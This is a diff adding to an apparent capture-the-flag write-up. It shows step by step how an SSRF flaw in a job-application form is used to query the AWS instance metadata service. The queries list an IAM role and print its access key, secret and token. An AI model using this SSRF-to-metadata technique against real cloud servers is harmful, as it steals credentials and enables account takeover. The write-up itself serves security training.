@@ -154,3 +154,55 @@ TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" \
 > $TOKEN" `http://169.254.169.254/latest/meta-data/placement/region`
 
 ---
+
+_Noxious O. D'or_:
+
+> Phew! That is something extra! Oh, and you solved the challenge too? Great!
+> Cloud assets are interesting targets for attackers. Did you know they
+> automatically get IMDS access? I'm very concerned about the combination of
+> SSRF and IMDS access. Did you know it's possible to harvest cloud keys through
+> SSRF and IMDS attacks? Dr. Petabyte told us, "anytime you see URL as an input,
+> test for SSRF." With an SSRF attack, we can make the server request a URL.
+> This can reveal valuable data! The AWS documentation for IMDS is interesting
+> reading.
+
+[AWS documentation for IMDS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
+
+Value submitted for form field "URL to your public NLBI report":
+<http://169.254.169.254>
+
+![Form result](img/frosttower01.png)
+
+Taking the URL of the not displayed image:
+
+```shell
+$ curl https://apply.jackfrosttower.com/images/ABC.jpg
+latest
+```
+
+Bingo !
+
+Next using `http://169.254.169.254/latest/meta-data/iam/security-credentials`
+and curl'ing the image URL again:
+
+```sh
+$ curl https://apply.jackfrosttower.com/images/ABC.jpg
+jf-deploy-role
+```
+
+Next, querying for the credentials of the 'jf-deploy-role'
+with
+`http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role`
+and curl'ing the image URL again yields:
+
+```json
+{
+  "Code": "Success",
+  "LastUpdated": "2021-05-02T18:50:40Z",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
+  "SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
+  "Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
+  "Expiration": "2026-05-02T18:50:40Z"
+}
+```
